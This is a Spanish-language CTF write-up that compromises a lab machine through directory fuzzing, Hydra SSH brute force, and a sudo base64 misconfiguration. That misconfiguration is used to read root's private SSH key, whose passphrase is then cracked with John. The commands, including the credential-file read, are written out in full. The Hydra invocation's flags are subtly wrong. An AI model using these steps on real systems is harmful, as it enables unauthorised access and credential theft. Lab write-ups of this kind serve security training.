# Sal y Azúcar - CTF Writeup

## Descripción
**Sal y Azúcar** es una máquina virtual de estilo CTF (Capture The Flag) enfocada en la enumeración web, fuerza bruta de servicios y escalada de privilegios mediante la explotación de permisos incorrectos de `sudo` y el crackeo de claves privadas.

---

## 1. Reconocimiento y Enumeración

### Escaneo de Puertos
Se inicia con un escaneo rápido para identificar los puertos abiertos en el objetivo (`192.168.0.111`):

```bash
extractports allports
[*] Extracting information...
[*] IP Address: 192.168.0.111
[*] Open ports: 22,80
[*] Ports copied to clipboard
```

### Detección de Servicios y Versiones
Con los puertos identificados, se ejecuta un escaneo detallado con Nmap:

```bash
nmap -sCV -p 22,80 192.168.0.111
```

**Resultado:**
*   **Puerto 22/TCP:** SSH (OpenSSH 9.2p1 Debian 2+deb12u2)
*   **Puerto 80/TCP:** HTTP (Apache httpd 2.4.57) - Muestra la página por defecto de Apache Debian.

---

## 2. Explotación e Intrusión

### Fuzzing Web (Descubrimiento de Directorios)
Al revisar el servidor web, se encuentra la página por defecto de Apache. Se realiza un fuzzing de directorios utilizando una lista de palabras común:

```bash
gobuster dir -u http://192.168.0.111/ -w /usr/share/wordlists/dirb/common.txt
```

Se descubre un directorio oculto con información relevante:
*   `http://192.168.0.111/summary/`

### Fuerza Bruta SSH
Utilizando posibles vectores o nombres obtenidos, se procede a realizar un ataque de fuerza bruta contra el servicio SSH empleando `Hydra`:

```bash
hydra -l /usr/share/wordlists/seclists/usernames/xato-net-10-million-usernames.txt -p /usr/share/wordlists/seclists/passwords/common-credentials/xato-net-10-million-passwords.txt ssh://192.168.0.111 -t 64
```

**Credenciales encontradas:**
*   **Usuario:** `info`
*   **Contraseña:** `qwerty`

Conectamos al objetivo de manera segura:
```bash
ssh info@192.168.0.111
```

---

## 3. Escalada de Privilegios (Privilege Escalation)

### Enumeración de Sudo
Una vez dentro como el usuario `info`, revisamos sus privilegios de administrador asignados:

```bash
info@salyazucar:~$ sudo -l
```

**Resultado:**
```text
User info may run the following commands on salyazucar:
    (root) NOPASSWD: /usr/bin/base64
```

El usuario puede ejecutar `/usr/bin/base64` como `root` sin proporcionar contraseña. Esto permite leer archivos confidenciales del sistema de forma indirecta.

### Lectura de la Clave Privada de Root
Explotamos el binario `base64` para codificar y luego decodificar la clave privada SSH de `root`, evadiendo las restricciones de lectura estándar:

```bash
sudo base64 /root/.ssh/id_rsa | base64 -d
```

Copiamos el contenido de la clave RSA obtenida y la guardamos en nuestra máquina atacante en un archivo llamado `id_rsa`.

### Crackeo de la Passphrase de la Clave RSA
La clave privada está protegida por una contraseña (passphrase). Primero, extraemos el hash de la clave utilizando `ssh2john`:

```bash
ssh2john id_rsa > hash.txt
```

A continuación, utilizamos `John the Ripper` junto con el diccionario `rockyou.txt` para romper el cifrado:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

**Resultado del crackeo:**
*   **Passphrase:** `honda1`

### Acceso Final como Root
Asignamos los permisos correctos a la clave privada en nuestra máquina:

```bash
chmod 600 id_rsa
```

Finalmente, nos conectamos por SSH utilizando la clave privada e ingresamos la passphrase obtenida (`honda1`):

```bash
ssh root@192.168.0.111 -i id_rsa
```

Confirmamos nuestra identidad en el sistema:
```bash
root@salyazucar:~# whoami
root
```

**¡Máquina comprometida con éxito!**
